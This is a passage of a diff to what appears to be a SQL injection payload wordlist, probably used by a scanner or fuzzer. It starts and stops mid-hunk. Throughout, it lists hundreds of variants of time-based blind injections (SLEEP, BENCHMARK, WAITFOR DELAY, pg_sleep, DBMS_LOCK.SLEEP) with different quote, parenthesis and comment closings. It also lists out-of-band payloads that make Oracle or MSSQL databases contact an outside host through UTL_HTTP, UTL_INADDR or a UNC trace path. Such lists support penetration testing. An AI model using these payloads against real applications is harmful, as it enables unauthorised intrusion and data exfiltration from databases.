+') and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') and ('1'='a
 ") and BENCHMARK(1000000,MD5('A')) and ("1"="a
 ") and SLEEP(10) and ("1"="a
 ") and WAITFOR DELAY '00:00:10' and ("1"="a
@@ -326,70 +726,6 @@
 ") and UTL_INADDR.get_host_name('10.0.0.1') and ("1"="a
 ") and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') and ("1"="a
 ") and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') and ("1"="a
-" and BENCHMARK(1000000,MD5('A'))   -- 
-" and BENCHMARK(1000000,MD5('A'))  /* 
-" and BENCHMARK(1000000,MD5('A')))   -- 
-" and BENCHMARK(1000000,MD5('A')))  /* 
-" and BENCHMARK(1000000,MD5('A'))))   -- 
-" and BENCHMARK(1000000,MD5('A'))))  /* 
-" and BENCHMARK(1000000,MD5('A')))))  -- 
-" and BENCHMARK(1000000,MD5('A'))))) /* 
-" and SLEEP(10)   -- 
-" and SLEEP(10)  /* 
-" and SLEEP(10))   -- 
-" and SLEEP(10))  /* 
-" and SLEEP(10)))   -- 
-" and SLEEP(10)))  /* 
-" and SLEEP(10))))  -- 
-" and SLEEP(10)))) /* 
-" and WAITFOR DELAY '00:00:10'   -- 
-" and WAITFOR DELAY '00:00:10'  /* 
-" and WAITFOR DELAY '00:00:10')   -- 
-" and WAITFOR DELAY '00:00:10')  /* 
-" and WAITFOR DELAY '00:00:10'))   -- 
-" and WAITFOR DELAY '00:00:10'))  /* 
-" and WAITFOR DELAY '00:00:10')))  -- 
-" and WAITFOR DELAY '00:00:10'))) /* 
-" and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))   -- 
-" and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))  /* 
-" and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))   -- 
-" and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))  /* 
-" and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))   -- 
-" and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))  /* 
-" and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))))  -- 
-" and (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))) /* 
-" and pg_sleep(10) is not null   -- 
-" and pg_sleep(10) is not null  /* 
-" and pg_sleep(10) is not null)   -- 
-" and pg_sleep(10) is not null)  /* 
-" and pg_sleep(10) is not null))   -- 
-" and pg_sleep(10) is not null))  /* 
-" and pg_sleep(10) is not null)))  -- 
-" and pg_sleep(10) is not null))) /* 
-" and UTL_INADDR.get_host_name('10.0.0.1')   -- 
-" and UTL_INADDR.get_host_name('10.0.0.1')  /* 
-" and UTL_INADDR.get_host_name('10.0.0.1'))   -- 
-" and UTL_INADDR.get_host_name('10.0.0.1'))  /* 
-" and UTL_INADDR.get_host_name('10.0.0.1')))   -- 
-" and UTL_INADDR.get_host_name('10.0.0.1')))  /* 
-" and UTL_INADDR.get_host_name('10.0.0.1'))))  -- 
-" and UTL_INADDR.get_host_name('10.0.0.1')))) /* 
-" and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')   -- 
-" and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')  /* 
-" and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))   -- 
-" and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))  /* 
-" and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))   -- 
-" and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))  /* 
-" and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))))  -- 
-" and UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))) /* 
-" and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')   -- 
-" and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')  /* 
-" and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))   -- 
-" and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))  /* 
-" and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))   -- 
-" and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))  /* 
-" and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))))  -- 
-" and UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))) /* 
 (BENCHMARK(1000000,MD5('A')))
 (SLEEP(10))
 (WAITFOR DELAY '00:00:10')
@@ -398,136 +734,136 @@
 (UTL_INADDR.get_host_name('10.0.0.1'))
 (UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))
 (UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))
-(BENCHMARK(1000000,MD5('A')))   -- 
-(BENCHMARK(1000000,MD5('A')))  /* 
-(BENCHMARK(1000000,MD5('A'))))   -- 
-(BENCHMARK(1000000,MD5('A'))))  /* 
-(BENCHMARK(1000000,MD5('A')))))   -- 
-(BENCHMARK(1000000,MD5('A')))))  /* 
+(BENCHMARK(1000000,MD5('A')))  -- 
+(BENCHMARK(1000000,MD5('A'))) /* 
+(BENCHMARK(1000000,MD5('A'))))  -- 
+(BENCHMARK(1000000,MD5('A')))) /* 
+(BENCHMARK(1000000,MD5('A')))))  -- 
+(BENCHMARK(1000000,MD5('A'))))) /* 
 (BENCHMARK(1000000,MD5('A'))))))  -- 
 (BENCHMARK(1000000,MD5('A')))))) /* 
-(SLEEP(10))   -- 
-(SLEEP(10))  /* 
-(SLEEP(10)))   -- 
-(SLEEP(10)))  /* 
-(SLEEP(10))))   -- 
-(SLEEP(10))))  /* 
+(SLEEP(10))  -- 
+(SLEEP(10)) /* 
+(SLEEP(10)))  -- 
+(SLEEP(10))) /* 
+(SLEEP(10))))  -- 
+(SLEEP(10)))) /* 
 (SLEEP(10)))))  -- 
 (SLEEP(10))))) /* 
-(WAITFOR DELAY '00:00:10')   -- 
-(WAITFOR DELAY '00:00:10')  /* 
-(WAITFOR DELAY '00:00:10'))   -- 
-(WAITFOR DELAY '00:00:10'))  /* 
-(WAITFOR DELAY '00:00:10')))   -- 
-(WAITFOR DELAY '00:00:10')))  /* 
+(WAITFOR DELAY '00:00:10')  -- 
+(WAITFOR DELAY '00:00:10') /* 
+(WAITFOR DELAY '00:00:10'))  -- 
+(WAITFOR DELAY '00:00:10')) /* 
+(WAITFOR DELAY '00:00:10')))  -- 
+(WAITFOR DELAY '00:00:10'))) /* 
 (WAITFOR DELAY '00:00:10'))))  -- 
 (WAITFOR DELAY '00:00:10')))) /* 
-((select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))   -- 
-((select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))  /* 
-((select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))   -- 
-((select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))  /* 
-((select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))))   -- 
-((select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))))  /* 
+((select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))  -- 
+((select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))) /* 
+((select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))  -- 
+((select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))) /* 
+((select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))))  -- 
+((select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))) /* 
 ((select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default))))))  -- 
 ((select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)))))) /* 
-(pg_sleep(10) is not null)   -- 
-(pg_sleep(10) is not null)  /* 
-(pg_sleep(10) is not null))   -- 
-(pg_sleep(10) is not null))  /* 
-(pg_sleep(10) is not null)))   -- 
-(pg_sleep(10) is not null)))  /* 
+(pg_sleep(10) is not null)  -- 
+(pg_sleep(10) is not null) /* 
+(pg_sleep(10) is not null))  -- 
+(pg_sleep(10) is not null)) /* 
+(pg_sleep(10) is not null)))  -- 
+(pg_sleep(10) is not null))) /* 
 (pg_sleep(10) is not null))))  -- 
 (pg_sleep(10) is not null)))) /* 
-(UTL_INADDR.get_host_name('10.0.0.1'))   -- 
-(UTL_INADDR.get_host_name('10.0.0.1'))  /* 
-(UTL_INADDR.get_host_name('10.0.0.1')))   -- 
-(UTL_INADDR.get_host_name('10.0.0.1')))  /* 
-(UTL_INADDR.get_host_name('10.0.0.1'))))   -- 
-(UTL_INADDR.get_host_name('10.0.0.1'))))  /* 
+(UTL_INADDR.get_host_name('10.0.0.1'))  -- 
+(UTL_INADDR.get_host_name('10.0.0.1')) /* 
+(UTL_INADDR.get_host_name('10.0.0.1')))  -- 
+(UTL_INADDR.get_host_name('10.0.0.1'))) /* 
+(UTL_INADDR.get_host_name('10.0.0.1'))))  -- 
+(UTL_INADDR.get_host_name('10.0.0.1')))) /* 
 (UTL_INADDR.get_host_name('10.0.0.1')))))  -- 
 (UTL_INADDR.get_host_name('10.0.0.1'))))) /* 
-(UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))   -- 
-(UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))  /* 
-(UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))   -- 
-(UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))  /* 
-(UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))))   -- 
-(UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))))  /* 
+(UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))  -- 
+(UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')) /* 
+(UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))  -- 
+(UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))) /* 
+(UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))))  -- 
+(UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))) /* 
 (UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw')))))  -- 
 (UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw'))))) /* 
-(UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))   -- 
-(UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))  /* 
-(UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))   -- 
-(UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))  /* 
-(UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))))   -- 
-(UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))))  /* 
+(UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))  -- 
+(UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')) /* 
+(UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))  -- 
+(UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))) /* 
+(UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))))  -- 
+(UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))) /* 
 (UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw')))))  -- 
 (UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw'))))) /* 
- ; BEGIN DBMS_LOCK.SLEEP(10); END;;  -- 
- ; BEGIN DBMS_LOCK.SLEEP(10); END;; /* 
- ; WAITFOR DELAY '00:00:10';  -- 
- ; WAITFOR DELAY '00:00:10'; /* 
- ; select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default);  -- 
- ; select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default); /* 
- ; select BENCHMARK(1000000,MD5('A'));  -- 
- ; select BENCHMARK(1000000,MD5('A')); /* 
- ; select SLEEP(10);  -- 
- ; select SLEEP(10); /* 
- ; select WAITFOR DELAY '00:00:10';  -- 
- ; select WAITFOR DELAY '00:00:10'; /* 
- ; select (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default));  -- 
- ; select (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)); /* 
- ; select pg_sleep(10) is not null;  -- 
- ; select pg_sleep(10) is not null; /* 
- ; select UTL_INADDR.get_host_name('10.0.0.1') from dual;  -- 
- ; select UTL_INADDR.get_host_name('10.0.0.1') from dual; /* 
- ; select UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') from dual;  -- 
- ; select UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') from dual; /* 
- ; select UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') from dual;  -- 
- ; select UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') from dual; /* 
-) ; BEGIN DBMS_LOCK.SLEEP(10); END;;  -- 
-) ; BEGIN DBMS_LOCK.SLEEP(10); END;; /* 
-) ; WAITFOR DELAY '00:00:10';  -- 
-) ; WAITFOR DELAY '00:00:10'; /* 
-) ; select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default);  -- 
-) ; select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default); /* 
-) ; select BENCHMARK(1000000,MD5('A'));  -- 
-) ; select BENCHMARK(1000000,MD5('A')); /* 
-) ; select SLEEP(10);  -- 
-) ; select SLEEP(10); /* 
-) ; select WAITFOR DELAY '00:00:10';  -- 
-) ; select WAITFOR DELAY '00:00:10'; /* 
-) ; select (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default));  -- 
-) ; select (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)); /* 
-) ; select pg_sleep(10) is not null;  -- 
-) ; select pg_sleep(10) is not null; /* 
-) ; select UTL_INADDR.get_host_name('10.0.0.1') from dual;  -- 
-) ; select UTL_INADDR.get_host_name('10.0.0.1') from dual; /* 
-) ; select UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') from dual;  -- 
-) ; select UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') from dual; /* 
-) ; select UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') from dual;  -- 
-) ; select UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') from dual; /* 
-)) ; BEGIN DBMS_LOCK.SLEEP(10); END;;  -- 
-)) ; BEGIN DBMS_LOCK.SLEEP(10); END;; /* 
-)) ; WAITFOR DELAY '00:00:10';  -- 
-)) ; WAITFOR DELAY '00:00:10'; /* 
-)) ; select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default);  -- 
-)) ; select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default); /* 
-)) ; select BENCHMARK(1000000,MD5('A'));  -- 
-)) ; select BENCHMARK(1000000,MD5('A')); /* 
-)) ; select SLEEP(10);  -- 
-)) ; select SLEEP(10); /* 
-)) ; select WAITFOR DELAY '00:00:10';  -- 
-)) ; select WAITFOR DELAY '00:00:10'; /* 
-)) ; select (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default));  -- 
-)) ; select (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)); /* 
-)) ; select pg_sleep(10) is not null;  -- 
-)) ; select pg_sleep(10) is not null; /* 
-)) ; select UTL_INADDR.get_host_name('10.0.0.1') from dual;  -- 
-)) ; select UTL_INADDR.get_host_name('10.0.0.1') from dual; /* 
-)) ; select UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') from dual;  -- 
-)) ; select UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') from dual; /* 
-)) ; select UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') from dual;  -- 
-)) ; select UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') from dual; /* 
+; BEGIN DBMS_LOCK.SLEEP(10); END;;  -- 
+; BEGIN DBMS_LOCK.SLEEP(10); END;; /* 
+; WAITFOR DELAY '00:00:10';  -- 
+; WAITFOR DELAY '00:00:10'; /* 
+; select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default);  -- 
+; select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default); /* 
+; select BENCHMARK(1000000,MD5('A'));  -- 
+; select BENCHMARK(1000000,MD5('A')); /* 
+; select SLEEP(10);  -- 
+; select SLEEP(10); /* 
+; select WAITFOR DELAY '00:00:10';  -- 
+; select WAITFOR DELAY '00:00:10'; /* 
+; select (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default));  -- 
+; select (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)); /* 
+; select pg_sleep(10) is not null;  -- 
+; select pg_sleep(10) is not null; /* 
+; select UTL_INADDR.get_host_name('10.0.0.1') from dual;  -- 
+; select UTL_INADDR.get_host_name('10.0.0.1') from dual; /* 
+; select UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') from dual;  -- 
+; select UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') from dual; /* 
+; select UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') from dual;  -- 
+; select UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') from dual; /* 
+); BEGIN DBMS_LOCK.SLEEP(10); END;;  -- 
+); BEGIN DBMS_LOCK.SLEEP(10); END;; /* 
+); WAITFOR DELAY '00:00:10';  -- 
+); WAITFOR DELAY '00:00:10'; /* 
+); select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default);  -- 
+); select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default); /* 
+); select BENCHMARK(1000000,MD5('A'));  -- 
+); select BENCHMARK(1000000,MD5('A')); /* 
+); select SLEEP(10);  -- 
+); select SLEEP(10); /* 
+); select WAITFOR DELAY '00:00:10';  -- 
+); select WAITFOR DELAY '00:00:10'; /* 
+); select (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default));  -- 
+); select (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)); /* 
+); select pg_sleep(10) is not null;  -- 
+); select pg_sleep(10) is not null; /* 
+); select UTL_INADDR.get_host_name('10.0.0.1') from dual;  -- 
+); select UTL_INADDR.get_host_name('10.0.0.1') from dual; /* 
+); select UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') from dual;  -- 
+); select UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') from dual; /* 
+); select UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') from dual;  -- 
+); select UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') from dual; /* 
+)); BEGIN DBMS_LOCK.SLEEP(10); END;;  -- 
+)); BEGIN DBMS_LOCK.SLEEP(10); END;; /* 
+)); WAITFOR DELAY '00:00:10';  -- 
+)); WAITFOR DELAY '00:00:10'; /* 
+)); select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default);  -- 
+)); select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default); /* 
+)); select BENCHMARK(1000000,MD5('A'));  -- 
+)); select BENCHMARK(1000000,MD5('A')); /* 
+)); select SLEEP(10);  -- 
+)); select SLEEP(10); /* 
+)); select WAITFOR DELAY '00:00:10';  -- 
+)); select WAITFOR DELAY '00:00:10'; /* 
+)); select (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default));  -- 
+)); select (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)); /* 
+)); select pg_sleep(10) is not null;  -- 
+)); select pg_sleep(10) is not null; /* 
+)); select UTL_INADDR.get_host_name('10.0.0.1') from dual;  -- 
+)); select UTL_INADDR.get_host_name('10.0.0.1') from dual; /* 
+)); select UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') from dual;  -- 
+)); select UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') from dual; /* 
+)); select UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') from dual;  -- 
+)); select UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') from dual; /* 
 ))); BEGIN DBMS_LOCK.SLEEP(10); END;;  -- 
 ))); BEGIN DBMS_LOCK.SLEEP(10); END;; /* 
 ))); WAITFOR DELAY '00:00:10';  -- 
@@ -550,72 +886,72 @@
 ))); select UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') from dual; /* 
 ))); select UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') from dual;  -- 
 ))); select UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') from dual; /* 
-' ; BEGIN DBMS_LOCK.SLEEP(10); END;;  -- 
-' ; BEGIN DBMS_LOCK.SLEEP(10); END;; /* 
-' ; WAITFOR DELAY '00:00:10';  -- 
-' ; WAITFOR DELAY '00:00:10'; /* 
-' ; select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default);  -- 
-' ; select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default); /* 
-' ; select BENCHMARK(1000000,MD5('A'));  -- 
-' ; select BENCHMARK(1000000,MD5('A')); /* 
-' ; select SLEEP(10);  -- 
-' ; select SLEEP(10); /* 
-' ; select WAITFOR DELAY '00:00:10';  -- 
-' ; select WAITFOR DELAY '00:00:10'; /* 
-' ; select (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default));  -- 
-' ; select (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)); /* 
-' ; select pg_sleep(10) is not null;  -- 
-' ; select pg_sleep(10) is not null; /* 
-' ; select UTL_INADDR.get_host_name('10.0.0.1') from dual;  -- 
-' ; select UTL_INADDR.get_host_name('10.0.0.1') from dual; /* 
-' ; select UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') from dual;  -- 
-' ; select UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') from dual; /* 
-' ; select UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') from dual;  -- 
-' ; select UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') from dual; /* 
-') ; BEGIN DBMS_LOCK.SLEEP(10); END;;  -- 
-') ; BEGIN DBMS_LOCK.SLEEP(10); END;; /* 
-') ; WAITFOR DELAY '00:00:10';  -- 
-') ; WAITFOR DELAY '00:00:10'; /* 
-') ; select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default);  -- 
-') ; select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default); /* 
-') ; select BENCHMARK(1000000,MD5('A'));  -- 
-') ; select BENCHMARK(1000000,MD5('A')); /* 
-') ; select SLEEP(10);  -- 
-') ; select SLEEP(10); /* 
-') ; select WAITFOR DELAY '00:00:10';  -- 
-') ; select WAITFOR DELAY '00:00:10'; /* 
-') ; select (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default));  -- 
-') ; select (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)); /* 
-') ; select pg_sleep(10) is not null;  -- 
-') ; select pg_sleep(10) is not null; /* 
-') ; select UTL_INADDR.get_host_name('10.0.0.1') from dual;  -- 
-') ; select UTL_INADDR.get_host_name('10.0.0.1') from dual; /* 
-') ; select UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') from dual;  -- 
-') ; select UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') from dual; /* 
-') ; select UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') from dual;  -- 
-') ; select UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') from dual; /* 
-')) ; BEGIN DBMS_LOCK.SLEEP(10); END;;  -- 
-')) ; BEGIN DBMS_LOCK.SLEEP(10); END;; /* 
-')) ; WAITFOR DELAY '00:00:10';  -- 
-')) ; WAITFOR DELAY '00:00:10'; /* 
-')) ; select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default);  -- 
-')) ; select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default); /* 
-')) ; select BENCHMARK(1000000,MD5('A'));  -- 
-')) ; select BENCHMARK(1000000,MD5('A')); /* 
-')) ; select SLEEP(10);  -- 
-')) ; select SLEEP(10); /* 
-')) ; select WAITFOR DELAY '00:00:10';  -- 
-')) ; select WAITFOR DELAY '00:00:10'; /* 
-')) ; select (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default));  -- 
-')) ; select (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)); /* 
-')) ; select pg_sleep(10) is not null;  -- 
-')) ; select pg_sleep(10) is not null; /* 
-')) ; select UTL_INADDR.get_host_name('10.0.0.1') from dual;  -- 
-')) ; select UTL_INADDR.get_host_name('10.0.0.1') from dual; /* 
-')) ; select UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') from dual;  -- 
-')) ; select UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') from dual; /* 
-')) ; select UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') from dual;  -- 
-')) ; select UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') from dual; /* 
+'; BEGIN DBMS_LOCK.SLEEP(10); END;;  -- 
+'; BEGIN DBMS_LOCK.SLEEP(10); END;; /* 
+'; WAITFOR DELAY '00:00:10';  -- 
+'; WAITFOR DELAY '00:00:10'; /* 
+'; select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default);  -- 
+'; select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default); /* 
+'; select BENCHMARK(1000000,MD5('A'));  -- 
+'; select BENCHMARK(1000000,MD5('A')); /* 
+'; select SLEEP(10);  -- 
+'; select SLEEP(10); /* 
+'; select WAITFOR DELAY '00:00:10';  -- 
+'; select WAITFOR DELAY '00:00:10'; /* 
+'; select (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default));  -- 
+'; select (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)); /* 
+'; select pg_sleep(10) is not null;  -- 
+'; select pg_sleep(10) is not null; /* 
+'; select UTL_INADDR.get_host_name('10.0.0.1') from dual;  -- 
+'; select UTL_INADDR.get_host_name('10.0.0.1') from dual; /* 
+'; select UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') from dual;  -- 
+'; select UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') from dual; /* 
+'; select UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') from dual;  -- 
+'; select UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') from dual; /* 
+'); BEGIN DBMS_LOCK.SLEEP(10); END;;  -- 
+'); BEGIN DBMS_LOCK.SLEEP(10); END;; /* 
+'); WAITFOR DELAY '00:00:10';  -- 
+'); WAITFOR DELAY '00:00:10'; /* 
+'); select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default);  -- 
+'); select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default); /* 
+'); select BENCHMARK(1000000,MD5('A'));  -- 
+'); select BENCHMARK(1000000,MD5('A')); /* 
+'); select SLEEP(10);  -- 
+'); select SLEEP(10); /* 
+'); select WAITFOR DELAY '00:00:10';  -- 
+'); select WAITFOR DELAY '00:00:10'; /* 
+'); select (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default));  -- 
+'); select (select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default)); /* 
+'); select pg_sleep(10) is not null;  -- 
+'); select pg_sleep(10) is not null; /* 
+'); select UTL_INADDR.get_host_name('10.0.0.1') from dual;  -- 
+'); select UTL_INADDR.get_host_name('10.0.0.1') from dual; /* 
+'); select UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') from dual;  -- 
+'); select UTL_INADDR.get_host_address('oracle1.5696d8f4.bzn.pw') from dual; /* 
+'); select UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') from dual;  -- 
+'); select UTL_HTTP.REQUEST('http://oracle2.5696d8f4.bzn.pw') from dual; /* 
+')); BEGIN DBMS_LOCK.SLEEP(10); END;;  -- 
+')); BEGIN DBMS_LOCK.SLEEP(10); END;; /* 
+')); WAITFOR DELAY '00:00:10';  -- 
+')); WAITFOR DELAY '00:00:10'; /* 
+')); select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default);  -- 
+')); select * from fn_trace_gettable('mssql.5696d8f4.bzn.pw\1.trc',default); /* 
+')); select BENCHMARK(1000000,MD5('A'));  -- 
+')); select BENCHMARK(1000000,MD5('A')); /* 
+')); select SLEEP(10);  -- 
+')); select SLEEP(10); /* 
+')); select WAITFOR DELAY '00:00:10';  -- 
+')); select WAITFOR DELAY '00:00:10'; /* 
